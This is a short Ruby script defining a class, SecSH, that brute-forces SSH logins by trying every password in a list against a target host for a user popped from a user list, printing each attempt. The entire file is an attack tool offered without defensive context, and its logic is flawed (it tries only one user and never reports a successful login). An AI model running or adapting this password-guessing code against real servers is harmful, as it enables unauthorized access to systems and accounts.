require 'net/ssh'
class SecSH
  def initialize host, passwords, users
    @host = host
    @passwords, @users = passwords, users
    staging
  end
  def user_pop
    if @users.length > 0
      a = @users.pop(1)
      return a[0]
    else
      return false
    end
  end
  def make_ssh user, pass
    begin
      options = {:password=>pass, :non_interactive=>true}
      Net::SSH.start(@host, user, options) do |session|
        @ssh = session
      end
    rescue Exception => e
      puts e
    end
  end
  def staging
    a = user_pop
    if a != false
      overlay a
    elsif a === false
      puts "no valid user/password combos found"
      return  
    end
  end
  def overlay user
    @passwords.each do |password|
      puts "trying #{user}:#{password}"
      make_ssh user, password
    end
  end
end
